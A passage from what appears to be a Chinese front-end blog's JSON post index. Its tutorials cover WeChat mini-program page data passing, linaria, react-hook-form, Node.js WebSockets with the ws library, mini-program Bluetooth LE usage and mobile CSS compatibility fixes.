rgba(1, 1, 1, 0.08); background-color: #fff; align-items: center; display: flex; padding: 0 12 * 2rpx; &#125;&#125; 最后在页面里使用即可。 一些问题设置页面的 enablePullDownRefresh 属性设置为 true，下拉刷新时，自定义头部跟随一起滚动。 目前解决方案就是不要设置为 true，并且下拉刷新都自己自定义实现一个。 参考资料无","categories":[{"name":"小程序","slug":"小程序","permalink":"http://me.lizhooh.com/categories/小程序/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"小程序","slug":"小程序","permalink":"http://me.lizhooh.com/tags/小程序/"}]},{"title":"小程序页面数据回传的解决方案","slug":"小程序/小程序页面数据回传的解决方案","date":"2020-05-28T01:03:42.000Z","updated":"2021-06-15T06:10:52.914Z","comments":true,"path":"/stories/2020/05/小程序/小程序页面数据回传的解决方案/","link":"","permalink":"http://me.lizhooh.com/stories/2020/05/小程序/小程序页面数据回传的解决方案/","excerpt":"前言小程序比较坑爹的是很多东西不能动态的生成，例如官方提供的 Tabs 不能动态生成。还有其他的坑，比如页面之间传值通过 url 参数的方向进行，因此导致了页面回退的时候不能把数据回传到父页面。在很多业务场景里都需要不同页面之间的数据传递，在 Android 里通过 Intent 可以进行数据回传，在小程序里官方没有提供相关接口，而是需要一种比较“屌丝”的方式去实现它。 React 的解决方案：Taro 小程序页面数据回传解决方案（装饰器）小程序在基础库：2.7.3 已经开始支持页面数据回传了，不过也是基于事件系统来实现。wx.navigateTo","text":"前言小程序比较坑爹的是很多东西不能动态的生成，例如官方提供的 Tabs 不能动态生成。还有其他的坑，比如页面之间传值通过 url 参数的方向进行，因此导致了页面回退的时候不能把数据回传到父页面。在很多业务场景里都需要不同页面之间的数据传递，在 Android 里通过 Intent 可以进行数据回传，在小程序里官方没有提供相关接口，而是需要一种比较“屌丝”的方式去实现它。 React 的解决方案：Taro 小程序页面数据回传解决方案（装饰器）小程序在基础库：2.7.3 已经开始支持页面数据回传了，不过也是基于事件系统来实现。wx.navigateTo 术语： 源页面：从 A 页面打开 B 页面，那么 A 就是源页面。 本页面：从 A 页面打开 B 页面，那么 B 就是本页面。 回传数据：关闭 B 页面时，将数据传递给 A 页面。 实现方式在 React 系的小程序开发框架，我采用 ES7 的装饰器方式来实现，在 Vue 系（特指 uniapp）的小程序开发里由于没有类组件和函数组件的概念，因此不能使用装饰器来实现，换成另外一种实现方式就是采用 订阅 与 发布 的形式，也就是事件系统。 采用事件系统可以使用 Vue 的事件总线：EventBus，但是我不喜欢它，而是使用一个轻量级的事件库：onfire.js，一个轻量级的事件订阅与发布库，只有 500k 大小。 onfire 的使用方式： 1234567import EE from 'onfire.js';const ee = new EE();ee.on('mouseover', () =&gt; &#123;&#125;); // 监听一个自定义事件ee.once('click', () =&gt; &#123;&#125;); // 仅监听一次事件ee.fire('click', 1, 'hello', true); // 发出/触发带有参数的事件，可以传任何类型的参数ee.off('click'); // 取消订阅活动 在 Vue 系（特指 uniapp）的小程序上实现页面数据回传，最开始的思路 在现在的页面里监听回传的事件。 在目标页里，退出时进行触发监听事件。 想在 main.js 里挂载在 vue 里： 1Vue.prototype.$fire = new onfire(); A 页面（传递数据给 B 页面）： 12345678910111213141516171819202122import qs from 'qs';export default &#123; onLoad() &#123; this.$fire.on('home-ret', res =&gt; &#123; console.log('回传数据'); console.log(res); &#125;); &#125;, onUnload() &#123; this.$fire.off('home-ret'); &#125;, methods: &#123; open() &#123; uni.navigateTo(&#123; url: './home?' + qs.stringify(&#123; title: '123abc', &#125;), &#125;); &#125;, &#125;,&#125; B 页面（回传数据给 A 页面）： 12345678910111213141516171819export default &#123; data() &#123; return &#123; title: '', &#125;; &#125;, onLoad: function (option) &#123; console.log(option); this.title = option.title; &#125;, methods: &#123; close() &#123; this.$fire.fire('home-ret', &#123; name: '试试看', &#125;); uni.navigateBack(); &#125;, &#125;,&#125; 使用这种方式实现了页面的数据回传，当然还有用 Vuex 的方式，当前如果两个页面之间的数量和关系不确定的话，Vuex 用起来比较麻烦。 改良我们可以看到，在 onLoad 事件里进行监听事件，在 onUnload 里进行卸载监听，这样页面多时重复代码会非常多，并且很累赘，下面来改良一下。 首先在 Vue 里改良的方法第一个是想到了 mixin 的方式，下面直接就写一个中间件来显示，最后通过 Vue.use 来使用。 约定： 在 A 页面里使用 ukey 来标识回传的页面 id，使用 ucallback 来指定回传数据的监听函数。 在 B 页面里使用 rkey 来标识传给目标页面的 id，使用 rcallback 来执行回传的数据。 这里有一个 BUG，如果在路由栈里面有多个相同 ukey 的页面呢？ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162const useOnfire = function (Vue, opts = &#123; ukey: 'ukey', rkey: 'rkey', rcallback: 'rcallback', uaction: 'uaction',&#125;) &#123; const onfire = new Onfire(); // 记录回传页面的 ukey，用于在执行 rcallback 时检查判断 const ukeys = new Set(); function isRunU(than, cb) &#123; const ukey = than.$options[opts.ukey]; const rkey = than.$options[opts.rkey]; const uaction = than.$options[opts.uaction]; // 如果组件上 ukey 属性为字符串，则用来指定时被回传的页面，uaction 指定回传时的监听函数 if (typeof ukey === 'string' &amp;&amp; typeof uaction === 'function') &#123; ukeys.add(ukey); // 这是回传时执行的回调函数 cb &amp;&amp; cb(); &#125; // 如果组件上 rkey 属性为字符串，则用来指定时被回传的页面，rcallback 指定回传时的监听函数 if (typeof rkey === 'string') &#123; if (ukeys.has(rkey)) &#123; // 往组件上添加函数 than.rcallback = function(cb) &#123; cb.call(than, data =&gt; onfire.fire(rkey, data)); &#125;; &#125; else &#123; const path = than.__route__ ? than.__route__ : '未知路径'; console.warn(`[$&#123;path&#125;] 没有找到与 rkey($&#123;rkey&#125;) 关联的 ukey`); &#125; &#125; &#125; // 这里就是采用 mixin 实现重复的代码。 Vue.mixin(&#123; onLoad() &#123; const ukey = this.$options[opts.ukey]; const uaction = this.$options[opts.uaction]; isRunU(this, () =&gt; &#123; onfire.on(ukey, uaction.bind(this)); &#125;); &#125;, onUnload() &#123; const ukey = this.$options[opts.ukey]; isRunU(this, () =&gt; &#123; ukeys.delete(ukey); onfire.off(ukey); &#125;); &#125;, destroyed() &#123; const ukey = this.$options[opts.ukey]; isRunU(this, () =&gt; &#123; ukeys.delete(ukey); onfire.off(ukey) &#125;); &#125; &#125;);&#125;;Vue.use(useOnfire); 使用的时候非常简单，在 A 页面里就是这样： 123456789101112131415161718import qs from 'qs';export default &#123; ukey: 'abc123', // 约定格式 uaction(data) &#123; // 约定格式 console.log('回传数据'); console.log(data); &#125;, methods: &#123; open() &#123; uni.navigateTo(&#123; url: './home?' + qs.stringify(&#123; title: '123abc', &#125;), &#125;); &#125; &#125;&#125; 在 B 页面里就是这样： 1234567891011export default &#123; rkey: 'abc123', methods: &#123; close() &#123; this.rcallback(done =&gt; &#123; done(&#123; name: '试试看' &#125;); &#125;); uni.navigateBack(); &#125; &#125;&#125; React 的实现方式之前的在 React 里是采用装饰器实现的，但是要使用类组件，如果使用函数组件那就没则了。这里换个思路基于 onfire 和 React Hooks 来实现数据回传，其实也非常简单,写法比 Vue 简单多了，逻辑可控性也更好。 首先写一个 Hooks 函数： 123456789101112131415161718192021222324252627import &#123; useEffect &#125; from '@tarojs/taro';import Onfire from 'onfire.js';const onfire = new Onfire();const ukeys: Set&lt;string&gt; = new Set();// 监听回传数据export function useRecFire(key, callback) &#123; useEffect(() =&gt; &#123; // 添加监听 if (!ukeys.has(key)) &#123; onfire.on(key, callback); ukeys.add(key); &#125; return () =&gt; &#123; ukeys.delete(key); onfire.off(key); &#125;; &#125;, []);&#125;// 进行回传数据export function useRetFire(key) &#123; return (cb) =&gt; &#123; cb.call(null, data =&gt; onfire.fire(key, data)); &#125;;&#125; A 页面（传递数据给 B 页面）： 123456789101112131415161718export default function Index() &#123; useRecFire('index-page', res =&gt; &#123; console.log('回传数据'); console.log(res); &#125;); const onClick = e =&gt; &#123; Taro.navigateTo(&#123; url: '/pages/home/home?' + qs.stringify(&#123; title: 'abc123', &#125;), &#125;); &#125;; return ( &lt;View&gt;&lt;/View&gt; );&#125; B 页面（回传数据给 A 页面）： 123456789101112131415export default function Home() &#123; const &#123; params &#125; = useRouter(); const title = params.title; const uAction = useRetFire('index-page'); const onClick = () =&gt; &#123; uAction(done =&gt; &#123; Taro.navigateBack(); done(&#123; name: '呵呵呵' &#125;); &#125;); &#125;; return ( &lt;View&gt;&lt;/View&gt; );&#125;","categories":[{"name":"小程序","slug":"小程序","permalink":"http://me.lizhooh.com/categories/小程序/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"小程序","slug":"小程序","permalink":"http://me.lizhooh.com/tags/小程序/"}]},{"title":"💅 零运行时的 CSS in JS 框架：linaria","slug":"React/Style/零运行时的 CSS in JS 框架：linaria","date":"2020-05-26T07:07:23.000Z","updated":"2021-06-15T06:10:52.886Z","comments":true,"path":"/stories/2020/05/React/Style/零运行时的 CSS in JS 框架：linaria/","link":"","permalink":"http://me.lizhooh.com/stories/2020/05/React/Style/零运行时的 CSS in JS 框架：linaria/","excerpt":"前言之前接触的两个 CSS in JS 框架：styled-components 和 emotion 都是采用 js 驱动，有运行时的框架。今天来介绍，一个完全无运行时的 CSS in JS 框架，那就是 linaria。 与 styled-components 和 emotion 相比，linaria 最大的特点就是 无运行时，它会在 Webpack/Parcel 编译是对你写的 CSS in JS 进行抽离，生成独立的 css 文件，脱离的 js 的动态生成样式的方式，其性能更加的好和轻量级，并且使用方式与 styled-compoents 类似，提供 styled 风格和 css 风格的两种模式。","text":"前言之前接触的两个 CSS in JS 框架：styled-components 和 emotion 都是采用 js 驱动，有运行时的框架。今天来介绍，一个完全无运行时的 CSS in JS 框架，那就是 linaria。 与 styled-components 和 emotion 相比，linaria 最大的特点就是 无运行时，它会在 Webpack/Parcel 编译是对你写的 CSS in JS 进行抽离，生成独立的 css 文件，脱离的 js 的动态生成样式的方式，其性能更加的好和轻量级，并且使用方式与 styled-compoents 类似，提供 styled 风格和 css 风格的两种模式。 styled 模式styled 模式就是一个样式就是一个组件。 1234567891011121314import &#123; styled &#125; from 'linaria/react';export default () =&gt; &#123; return ( &lt;div&gt; &lt;Title&gt;Hello&lt;/Title&gt; &lt;/div&gt; );&#125;const Title = styled.div` font-size: 20px; color: #39f;`; css 模式css 模式就是通过 class 来实现的样式，个人更加喜欢这种方式。 12345678910111213141516import &#123; css &#125; from 'linaria';export default () =&gt; &#123; return ( &lt;div&gt; &lt;div className=&#123;styles.text&#125;&gt; Hello&lt;/div&gt; &lt;/div&gt; );&#125;const styles = &#123; text: css` font-size: 25px; color: #f34; `,&#125;; 静态变量linaria 支持静态的变量赋值，但是不支持动态的变量赋值，例如不支持主题功能，不支持将 state 注入到样式里。 以下方式是支持的： 12345const color = '#f34';const text = css` font-size: 25px; color: $&#123;color&#125;;`, 如果你要想做主题功能，请使用 css 变量的方式。 1234567891011const a = css` --color-primary: #6200ee; --color-accent: #03dac4;`;const b = css` --color-primary: #03a9f4; --color-accent: #e91e63;`;&lt;Container className=&#123;a&#125; /&gt;; Data 属性可以定义在元素上的 data attr，来指定样式。 1234567891011121314151617181920212223import React from 'react';import &#123; css &#125; from 'linaria';const box = css` &amp;[data-valid] &#123; color: yellow; &#125; &amp;[data-valid=\"invalid\"] &#123; color: red; &#125; &amp;[data-valid=\"valid\"] &#123; color: green; &#125;`;export function Box(&#123; color, valid &#125;) &#123; return ( &lt;div className=&#123;box&#125; data-valid=&#123;valid ? 'valid' : 'invalid'&#125; /&gt; );&#125; 在 Create React App 的项目上使用安装 craco 和 craco-linaria，更改 npm script 为 craco 操作，接着添加 craco.config.js 文件在项目根目录上。 12345678910const CracoLinariaPlugin = require('craco-linaria');module.exports = &#123; plugins: [&#123; plugin: CracoLinariaPlugin, options: &#123; // Linaria options &#125;, &#125;],&#125; 参考资料 https://github.com/callstack/linaria","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"react-hook-form：一个表单终结者 hook 库","slug":"React/Hooks/react-hook-form：一个表单终结者 hook 库","date":"2020-05-25T14:22:43.000Z","updated":"2021-06-15T06:10:52.873Z","comments":true,"path":"/stories/2020/05/React/Hooks/react-hook-form：一个表单终结者 hook 库/","link":"","permalink":"http://me.lizhooh.com/stories/2020/05/React/Hooks/react-hook-form：一个表单终结者 hook 库/","excerpt":"前言React-Hook-Form 是一个基于 hooks 的表单处理库，它的特点就是使用简单，高性能，其核心原理就是使用 ref 来实现细粒度的数据更新。","text":"前言React-Hook-Form 是一个基于 hooks 的表单处理库，它的特点就是使用简单，高性能，其核心原理就是使用 ref 来实现细粒度的数据更新。 简单使用使用 useForm 这个 hook 函数来挂载钩子，其返回值有 register、handleSubmit、watch、errors。 说明： register：用于绑定表单元素。 handleSubmit：用于绑定提交时的事件，参数自带提交的 data。 watch：用于监听某个表单元素的值改变时触发。 errors：如果表单输入不通过验证时，就会储存在 errors 对象里。 1234567891011121314151617import React from 'react';import &#123; useForm &#125; from 'react-hook-form';export default () =&gt; &#123; const &#123; register, handleSubmit, watch, errors &#125; = useForm(); const onSubmit = data =&gt; console.log(data); console.log(watch('example')); return ( &lt;form onSubmit=&#123;handleSubmit(onSubmit)&#125;&gt; &lt;input name='example' defaultValue='test' ref=&#123;register&#125; /&gt; &lt;input name='exampleRequired' ref=&#123;register(&#123; required: true &#125;)&#125; /&gt; &#123;errors.exampleRequired &amp;&amp; &lt;span&gt;This field is required&lt;/span&gt;&#125; &lt;input type='submit' /&gt; &#123;/* &lt;button onClick=&#123;handleSubmit(onSubmit)&#125;&gt;提交&lt;/button&gt; */&#125; &lt;/form&gt; );&#125;; 使用 register 绑定表单元素有两种方式，一种是在元素上指定 name，使用 ref={register} 即可。如果是使用第三方或者在 React-Native 上使用，可能就没有 name 属性，那么就得这样使用 ref={register({ name: &#39;xxxx&#39; })}，其道理都是一样的，只是表现形式不同而已。 表单验证React-Hook-Form 默认提供以下的表单验证方式，其他则需要自己自定义了： required min，max minLength，maxLength pattern（正则匹配） validate 123&lt;input name='firstName' ref=&#123;register(&#123; required: true, maxLength: 20 &#125;)&#125; /&gt;&lt;input name='lastName' ref=&#123;register(&#123; pattern: /^[A-Za-z]+$/i &#125;)&#125; /&gt;&lt;input name='age' type='number' ref=&#123;register(&#123; min: 18, max: 99 &#125;)&#125; /&gt; 错误处理首先，在 errors 对象里，默认是空对象，如果有验证不通过，则会往 errors 对象里添加 key 为某个 name 的对象，因此可以利用与或来显示错误提示信息。 1&#123;errors.exampleRequired &amp;&amp; &lt;span&gt;This field is required&lt;/span&gt;&#125; 在 Antd 上使用为什么特别提 Antd，因为 Antd 的组件设计比较特别，特别是表单这方面，Antd 采用的是内部 state 的数据管理方式，因此使用 React-Hook-Form 时需要采用容器包裹的方式。 参考资料 https://react-hook-form.com/get-started#Quickstart","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"Nodejs Websocket 简易指南","slug":"Nodejs/Nodejs Websocket 简易指南","date":"2020-05-24T11:03:08.000Z","updated":"2021-06-15T06:10:52.836Z","comments":true,"path":"/stories/2020/05/Nodejs/Nodejs Websocket 简易指南/","link":"","permalink":"http://me.lizhooh.com/stories/2020/05/Nodejs/Nodejs Websocket 简易指南/","excerpt":"前言最近想用 Websocket 开发一个实时的应用，在 Nodejs 当然是优先选择 socket.io，但是如果客户端不使用 socket.io 而是使用原生的 Websocket API 呢？那么服务端就不能用 socket.io 了。 在 Nodejs 上官方的 API 并不提供 Websocket 模块，因此我们需要使用第三方库，常用的就是 ws。","text":"前言最近想用 Websocket 开发一个实时的应用，在 Nodejs 当然是优先选择 socket.io，但是如果客户端不使用 socket.io 而是使用原生的 Websocket API 呢？那么服务端就不能用 socket.io 了。 在 Nodejs 上官方的 API 并不提供 Websocket 模块，因此我们需要使用第三方库，常用的就是 ws。 基本使用Websocket 的接口相对比较简单，整体来说，主要是一个发送消息和接收消息的过程。一般使用 Websocket 的流程是：1. 连接服务，2. 监听和发送消息。 Websocket 发送消息使用的是 ws.send 函数，接收消息使用的是 ws.on(‘message’) 来接收。 ws 库实现了标准 Websocket API，支持 ws 和 wss 协议，下面来安装它。 1yarn add ws 服务端服务端操作就是创建一个 Websocket Server，注意需要指定端口，默认是 80。 1234567891011121314151617181920212223242526const ws = require('ws');const server = new ws.Server(&#123; port: 3324,&#125;);// 监听 socket 连接server.on('connection', socket =&gt; &#123; // 有人连接了，先给它创建一个 id socket.id = Math.random().toString(32).slice(2); // 有人连接了，先回复一个 welcome socket.send('welcome'); console.log('welcome id: ' + socket.id); socket.on('message', data =&gt; &#123; console.log(data); socket.send(data + ' --- '); &#125;); socket.on('error', err =&gt; &#123; console.log(err); &#125;); socket.on('close', () =&gt; &#123; console.log('leave id: ' + socket.id); &#125;);&#125;);console.log('ws://127.0.0.1:3324'); 客户端客户端就是连接 Websocket Server 服务器，需要指定协议。 123456789101112131415const ws = require('ws');const client = new ws('ws://127.0.0.1:3324');client.on('open', () =&gt; &#123; console.log('我连上了'); client.send('hello');&#125;);client.on('close', () =&gt; &#123; console.log('断开连接');&#125;);client.on('message', res =&gt; &#123; console.log('收到的消息：', res);&#125;); 基于事件的 API 设计大致是想实现 socket.io 的对等事件 API，大概是 Websocket 原始提供了 message 和事件监听和 send 的数据发送，能不能像 socket.io 一样，发送消息使用 io.emit(‘type’, ‘data’)，接收消息使用 io.on(‘type’, data =&gt; {})，来操作的，答案是可以的，那就要自己封装一下了。 下面来介绍如何基于 Event 对象来实现客户端和服务端对等事件。 大致的思路时，首先在实现一个类继承 Event，在构造函数里进行 message 的监听，如果监听到，则解析和分发数据，注意要触发 super.emit 而不是 this.emit。 123456789101112131415161718192021222324252627282930const Event = require('events');class Sio extends Event &#123; constructor(socket) &#123; super(); this.socket = socket; // 关键 this.socket.on('message', res =&gt; &#123; try &#123; const &#123; command, data &#125; = JSON.parse(res); if (command &amp;&amp; data) &#123; super.emit(command, data); &#125; &#125; catch (err) &#123; console.log(err); //... &#125; &#125;); &#125; on(type = '', cb = Function) &#123; super.on(type, cb); &#125; emit(type = '', data) &#123; const str = JSON.stringify(&#123; command: type, data &#125;); this.socket.send(str); &#125;&#125;module.exports = Sio; 使用的时候就非常简单了： 12345// 监听 news 事件的消息sio.on('news', data =&gt; &#123;&#125;);// 发送 news 事件的数据sio.emit('news', 'hello'); 之后服务端改造为： 12345678910111213141516171819202122const ws = require('ws');const Sio = require('./sio');const server = new ws.Server(&#123; port: 3324,&#125;);// 监听 socket 连接server.on('connection', socket =&gt; &#123; // 有人连接了，先给它创建一个 id socket.id = Math.random().toString(32).slice(2); // 有人连接了，先回复一个 welcome const sio = new Sio(socket); sio.emit('news', 'welcome') console.log('welcome id: ' + socket.id); sio.on('hello', res =&gt; &#123; console.log(res); &#125;);&#125;);console.log('ws://127.0.0.1:3324'); 之后客户端改造为： 12345678910111213141516const ws = require('ws');const Sio = require('./sio');const client = new ws('ws://127.0.0.1:3324');const sio = new Sio(client);+ async function () &#123; await new Promise((resolve, reject) =&gt; &#123; client.on('open', resolve); &#125;); sio.emit('hello', '你好'); sio.on('news', res =&gt; &#123; console.log('收到的消息：', res); &#125;);&#125;(); 好轻松实现了。 参考资料 https://www.npmjs.com/package/ws","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/categories/Nodejs/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"}]},{"title":"小程序蓝牙开发指南","slug":"小程序/小程序蓝牙开发指南","date":"2020-05-23T07:26:14.000Z","updated":"2021-06-15T06:10:52.914Z","comments":true,"path":"/stories/2020/05/小程序/小程序蓝牙开发指南/","link":"","permalink":"http://me.lizhooh.com/stories/2020/05/小程序/小程序蓝牙开发指南/","excerpt":"前言小程序提供两种蓝牙的接口，一种是 ibeacon，一种是 ble 4.0（低功耗蓝牙）。蓝牙的应该场景非常广泛，在生活中已经有非常广泛的应用场景了，例如手环，手表，蓝牙耳机，蓝牙锁等。 本文介绍蓝牙的基础知识和如何在小程序上使用蓝牙，控制蓝牙设备。","text":"前言小程序提供两种蓝牙的接口，一种是 ibeacon，一种是 ble 4.0（低功耗蓝牙）。蓝牙的应该场景非常广泛，在生活中已经有非常广泛的应用场景了，例如手环，手表，蓝牙耳机，蓝牙锁等。 本文介绍蓝牙的基础知识和如何在小程序上使用蓝牙，控制蓝牙设备。 蓝牙在蓝牙里，需要知道几个特定的名称：UUID，服务（Services），特征值（Characteristics），其他可以无视。 蓝牙不难，但是烦人，调试困难，蓝牙传输还要转成字节码，还要进行 aes 加密，蓝牙读写数据步骤繁多，调试麻烦。 UUIDUUID 是一个唯一的标识符，在蓝牙设备，设备的服务，服务中的特征值都有 UUID，可以利用 UUID 的唯一性来确定其服务、特征值等。 服务（Services）一个蓝牙设备里有多个服务，每个服务里有多个特征值。 特征值（Characteristics）特征值在服务里面，每一个服务都有一个或多个特征值。一般来说，如果想要给蓝牙传输数据，或者监听数据回传，那么就要向特征值进行读写数据。 特征值有分 write/read 的读写权限，这部分权限是在硬件设备出厂时，设置的，一旦设计好之后就不能修改了。 低功耗蓝牙一般设备用蓝牙用低功耗蓝牙比较多，比如手环，手表，蓝牙耳机等，这些都是用低功耗蓝牙。 蓝牙操作流程无论怎样，整个蓝牙都是围绕着怎么读数据和写数据进行，毕竟只有进行了读写数据，蓝牙才有交互的价值。 第一步：初始化蓝牙模块初始化蓝牙，如果手机没有开启蓝牙或者不支持蓝牙会初始化失败，请做一下这种情况的判断。 1234// 在微信小程序上wx.openBluetoothAdapter(&#123; &#125;);// 在 react native 上BleManager.start(&#123; &#125;); 第二步：搜索蓝牙设备搜索蓝牙，就不符合条件的蓝牙都会搜索到，包括笔记本的蓝牙，充电器里的蓝牙，手环的蓝牙星号，因此搜索出来会有很多个，注意筛选。 1234// 在微信小程序上wx.startBluetoothDevicesDiscovery(&#123; &#125;);// 在 react native 上BleManager.scan([], 10, true); // 搜索 10s 一般会得到以下数据格式： 12345678&#123; deviceId: '01:96:AC:17:79:59', name: '', // 厂家出厂时固定 RSSI: -70, // 信号值 localName: '', advertisServiceUUIDs: [], advertisData: &#123;&#125;,&#125; 第三步：连接指定的蓝牙设备在搜索出来的蓝牙列表里，选择指定的蓝牙进行连接，注意有可能会连接失败，或者连接断开的情况，请注意一下判断。 1234// 微信小程序wx.createBLEConnection(&#123; deviceId &#125;);// react nativeBleManager.connect(peripheralId); 第四步：获取蓝牙设备的服务列表连接上某个蓝牙时就可以直接获取其服务列表，注意一个蓝牙设备会有很多个服务，一个服务会有很多个特征值。 1234// 微信小程序wx.getBLEDeviceServices(&#123; deviceId &#125;);// react nativeBleManager.retrieveServices(peripheralId); 第五步：获取某服务的 UUID，找到其特征值列表特征值会分为 read，write，有读写方面的权限控制，请参考硬件商的设计，例如一下的图。 1234// 微信小程序wx.getBLEDeviceCharacteristics(&#123; deviceId, serviceId &#125;);// react nativeBleManager.retrieveServices(peripheralId, [serviceUUIDs]); 第六步：某特征值写入/读取数据特征值的读写需要用 byte 字节码进行，因此需要先做转换。 例如上图，假设 token 是 01020304，随机填充是 AABBCCDD，进行写入 504E010101020304AABBCCDDEEFFGGHH。 123456// 微信小程序wx.writeBLECharacteristicValue(&#123; deviceId, serviceId, characteristicId, value &#125;);wx.readBLECharacteristicValue(&#123; deviceId, serviceId, characteristicId &#125;);// react nativeBleManager.write(peripheralId, serviceUUID, characteristicUUID, data);BleManager.read(peripheralId, serviceUUID, characteristicUUID); 第七步：监听特征值的回传数据再对特征值进行写入操作之后或得到一个回传数据。 例如上图，回传的数据是 504F09112233445566778899AABBCCDD，PMS 的值是 112233445566778899。 1234// 微信小程序wx.notifyBLECharacteristicValueChange(&#123; deviceId, serviceId, characteristicId, state: true &#125;);// react nativeBleManager.startNotification(peripheral, service, characteristic); 一些问题字节码因为蓝牙的传输数据格式只能是 byte[] 类型的，因此需要做一些转换。 期间的数据格式转换，参考 https://www.npmjs.com/package/utf8-string-bytes 或者，下面的实现方式。 参考一些代码实现 字符串转换成 byte 数组： 1234567891011121314151617181920212223function stringToByte(str = '') &#123; const bytes = []; let len = str.length, c; for (let i = 0; i &lt; len; i++) &#123; c = str.charCodeAt(i); if (c &gt;= 0x010000 &amp;&amp; c &lt;= 0x10FFFF) &#123; bytes.push(((c &gt;&gt; 18) &amp; 0x07) | 0xF0); bytes.push(((c &gt;&gt; 12) &amp; 0x3F) | 0x80); bytes.push(((c &gt;&gt; 6) &amp; 0x3F) | 0x80); bytes.push((c &amp; 0x3F) | 0x80); &#125; else if (c &gt;= 0x000800 &amp;&amp; c &lt;= 0x00FFFF) &#123; bytes.push(((c &gt;&gt; 12) &amp; 0x0F) | 0xE0); bytes.push(((c &gt;&gt; 6) &amp; 0x3F) | 0x80); bytes.push((c &amp; 0x3F) | 0x80); &#125; else if (c &gt;= 0x000080 &amp;&amp; c &lt;= 0x0007FF) &#123; bytes.push(((c &gt;&gt; 6) &amp; 0x1F) | 0xC0); bytes.push((c &amp; 0x3F) | 0x80); &#125; else &#123; bytes.push(c &amp; 0xFF); &#125; &#125; return bytes;&#125; 参考一些代码实现 byte 数组转换成字符串： 12345678910111213141516171819202122function byteToString(arr = []) &#123; if (typeof arr === 'string') &#123; return arr; &#125; let str = '', _arr = arr; for (let i = 0; i &lt; _arr.length; i++) &#123; let one = _arr[i].toString(2), v = one.match(/^1+?(?=0)/); if (v &amp;&amp; one.length == 8) &#123; let bytesLength = v[0].length; let store = _arr[i].toString(2).slice(7 - bytesLength); for (let st = 1; st &lt; bytesLength; st++) &#123; store += _arr[st + i].toString(2).slice(2); &#125; str += String.fromCharCode(parseInt(store, 2)); i += bytesLength - 1; &#125; else &#123; str += String.fromCharCode(_arr[i]); &#125; &#125; return str;&#125; 数据加密微信硬件平台，支持对蓝牙传输的数据进行加密，加密算法是 aes128，cbc 模式，pkcs7 填充，初始向量为密钥。 调试问题因为蓝牙传输的数据限定了 32 位字节码，因此硬件厂商对传输的数据协议的设计需要很精密。 另外小程序 IDE 只支持 mac 系统的蓝牙调试，因此如果没有 mac 的话，要没改一次代码就进行真机调试，真机调试经常出现搜索不到蓝牙列表的情况，并且有时候会出现连接了就立刻自动断开的情况，另外 android 和 ios 的蓝牙又有一些坑。 所有，弄蓝牙模块不是很简单的事情。 参考资料 https://iot.weixin.qq.com/wiki/new/index.html?page=4-2-2","categories":[{"name":"小程序","slug":"小程序","permalink":"http://me.lizhooh.com/categories/小程序/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"小程序","slug":"小程序","permalink":"http://me.lizhooh.com/tags/小程序/"}]},{"title":"移动端兼容性问题收集","slug":"移动端/移动端兼容性问题收集","date":"2020-05-22T09:02:33.000Z","updated":"2021-06-15T06:10:52.920Z","comments":true,"path":"/stories/2020/05/移动端/移动端兼容性问题收集/","link":"","permalink":"http://me.lizhooh.com/stories/2020/05/移动端/移动端兼容性问题收集/","excerpt":"前言移动端兼容性问题，坑多多，iOS 和 Android 都有。","text":"前言移动端兼容性问题，坑多多，iOS 和 Android 都有。 移动端兼容性问题Android背景图片有些设备会模糊原因是手机的分辨率太小。 解决方案： 用 2X 图片来代替 img 标签，然后 123.img &#123; background-size: contain;&#125; 点击链接出现蓝色框解决方案： 1body &#123; -webkit-tap-highlight-color:rgba(0, 0, 0, 0); &#125; 安卓手机的圆角失效解决方案： 1* &#123; background-clip: padding-box; &#125; 默认会对邮箱地址的识别解决方案： 1&lt;meta name=\"format-detection\" content=\"telephone=no\"&gt; iOSiOS 滚动条惯性失效解决方案： 1* &#123; overflow-scrolling: touch; &#125; 禁止自动识别号码解决方案： 1&lt;meta content=\"telephone=no\" name=\"format-detection\"&gt; 点击链接出现蓝色框解决方案： 1* &#123; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); &#125; 设置 input 按钮样式会被默认样式覆盖解决方案： 12345input,textarea &#123; border: 0; -webkit-appearance: none;&#125; iOS 上的下拉框会有圆角解决方案： 123select &#123; border-radius: 0;&#125; iOS 下输入框设置 readonly 仍会聚焦解决方案：改为 disabled。 iOS 在播放视频时，会出现短暂的黑屏解决方案：在视频上层添加一个海报图，制作播放前加载的假象。监听 onload 事件，加载完成后去掉海报。 iOS 中无法点击 span, div解决方案： 1span, div &#123; cursor: pointer; &#125; iOS 上双击强制缩放问题设置为 viewport 也不行。 解决方案： 1* &#123; touch-action: manipulation; &#125; iOS 上 input 存在重影边框问题解决方案： 12345input &#123; outline: none; -webkit-appearance: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);&#125; iOS 微信浏览器中重新设置 document.title 无效解决方案：创建一个内容为空的 iframe，随后立即删除这个 